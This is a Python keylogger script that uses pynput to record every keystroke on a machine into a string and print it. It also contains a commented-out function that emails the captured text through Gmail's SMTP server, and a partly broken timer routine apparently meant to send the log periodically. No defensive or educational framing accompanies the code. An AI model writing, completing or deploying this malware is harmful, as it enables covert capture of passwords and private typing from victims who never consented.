#!/usr/bin/env python3 
import pynput.keyboard as pynput 
import smtplib
from email.mime.text import MIMEText
from termcolor import colored
import signal, sys, threading

# Global Vars
keys_pressed = ""
exit_value = False
first_time = True 
timer = None
VALUES = {
    "Key.space": " ",
    "Key.cmd": " (Window) ",
    "Key.up": " (Arrow UP) ",
    "Key.left": " (Arrow LEFT) ",
    "Key.right": " (Arrow RIGHT) ",
    "Key.down": " (Arrow DOWN) ",
}
# Email Vars
# subject = "KEYLOGGER MESSAGE"
# email = ""


# Ctrl + C 
def ctrl_c(sig, frame):
    print(colored("\n\n\t[!] Quiting...\n\n", "red"))
    global exit_value
    exit_value = True 
    if timer: # End thread
        timer.cancel()
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Keylogger
def touched_key(key):
    try:
        global keys_pressed
        keys_pressed+=str(key.char)
    except AttributeError:
        parsed_key = VALUES.get(str(key), f" ({str(key).split('.')[-1]}) ")
        keys_pressed+=parsed_key

    print(keys_pressed)

# Send email
# def send_email(subject, body, sender, recipients, password):
#     msg = MIMEText(body)   # Creating msg object using MIMEText class of email module
#     msg['Subject'] = subject  # Assigning the subject
#     msg['From'] = sender  # Assigning the sender email address
#     msg['To'] = ', '.join(recipients)  # Assigning recepients email address.
#     with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:   # Creating connection using context manager
#         smtp_server.login(sender, password)
#         smtp_server.sendmail(sender, recipients, msg.as_string())
#     print("Email sent Successfully!")

# Send input to a mail 
def send_input():
    global keys_pressed, timerq
    keys_pressed = ""

    if exit_value:
        timer = threading.Timer(5, send_input)
        timer.start()
    

# Start Keylogger
if __name__ == "__main__":
    keyboard_listener = pynput.Listener(on_press=touched_key)

    with keyboard_listener:
        send_input()
        keyboard_listener.join() # Start the listener
